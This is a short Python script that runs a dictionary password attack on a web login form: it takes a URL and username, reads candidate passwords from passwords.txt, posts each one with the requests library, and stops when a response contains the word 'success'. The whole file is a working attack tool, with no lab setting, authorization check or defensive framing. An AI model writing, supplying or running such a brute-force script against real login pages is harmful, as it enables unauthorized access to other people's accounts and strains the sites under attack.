import requests

def brute_force():
    url = input("Enter login URL: ")
    username = input("Enter username: ")

    try:
        with open("passwords.txt", "r") as file:
            passwords = file.readlines()
    except:
        print("passwords.txt not found!")
        return

    for pwd in passwords:
        pwd = pwd.strip()

        data = {
            "username": username,
            "password": pwd
        }

        try:
            response = requests.post(url, data=data)

            print(f"Tried: {pwd} | Length: {len(response.text)}")

            if "success" in response.text.lower():
                print(f"\nPassword found: {pwd}")
                break

        except:
            print("Request failed")